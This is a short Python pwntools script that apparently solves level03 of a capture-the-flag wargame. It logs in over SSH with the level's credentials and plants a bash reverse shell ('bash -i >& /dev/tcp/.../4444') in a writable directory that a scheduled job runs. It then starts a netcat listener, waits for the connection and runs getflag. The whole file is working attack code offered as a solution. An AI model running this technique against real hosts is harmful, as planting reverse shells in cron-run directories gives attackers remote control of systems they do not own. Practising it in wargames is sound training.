#!/usr/bin/python3

from pwn import *
from sys import argv,exit
from time import sleep

if len(argv) < 3:
	sys.exit(f"{argv[0]} Target IP Local IP") 

level03 = ssh(host=argv[1],user='level03',password='level03')

remote_pro = level03.process('bash')
remote_pro.sendline(f'echo "bash -i >& /dev/tcp/{argv[2]}/4444 0>&1" > /home/flag03/writable.d/exploit.sh')
remote_pro.sendline('chmod +x /home/flag03/writable.d/exploit.sh')
local_pro = process(['nc','-nvlp','4444'])
log.waitfor('Hold 3 Minutes For Reverse Connection...')
sleep(180)
local_pro.sendline('getflag')
local_pro.interactive()
